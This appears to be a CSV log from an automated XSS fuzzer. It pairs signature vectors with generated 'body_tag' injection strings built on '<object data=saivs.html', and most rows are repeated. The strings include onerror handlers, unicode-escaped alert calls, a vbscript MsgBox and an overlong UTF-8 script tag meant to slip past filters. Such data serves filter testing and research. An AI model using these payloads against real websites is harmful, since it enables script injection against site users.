eval_place,sig_vector,sig_string
0,1,2
body_tag,"[26, 48, 188, 262, 85]","<object onerror=javascript:alert();""javascript:/a/-alert(1)///////""<video><track default src=""<!--"
body_tag,"[26, 48, 188, 262, 85]","<object onerror=javascript:alert();""javascript:/a/-alert(1)///////""<video><track default src=""<!--"
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 262, 250]","<object data=saivs.html <noembed><video><track default src=""\u{0000000061}lert(1)"
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 262, 250]","<object data=saivs.html <noembed><video><track default src=""\u{0000000061}lert(1)"
body_tag,"[26, 45, 209, 262, 250]","<object data=saivs.html <noembed><video><track default src=""\u{0000000061}lert(1)"
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 262, 250]","<object data=saivs.html <noembed><video><track default src=""\u{0000000061}lert(1)"
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 262, 70]","<object data=saivs.html <noembed><video><track default src="""""
body_tag,"[26, 45, 209, 262, 70]","<object data=saivs.html <noembed><video><track default src="""""
body_tag,"[26, 45, 209, 200, 250]",<object data=saivs.html <noembed>key == 'window'\u{0000000061}lert(1)
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 250]",<object data=saivs.html <noembed>key == 'window'\u{0000000061}lert(1)
body_tag,"[26, 45, 209, 262, 70]","<object data=saivs.html <noembed><video><track default src="""""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 257, 39]",<object data=saivs.html <noembed>vbscript:MsgBox+1src=/ 
body_tag,"[26, 45, 209, 262, 70]","<object data=saivs.html <noembed><video><track default src="""""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 162, 212, 181]","<object data=saivs.html %F0%80%80%BCscript></noscript><img src="""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
body_tag,"[26, 45, 209, 200, 70]","<object data=saivs.html <noembed>key == 'window'"""
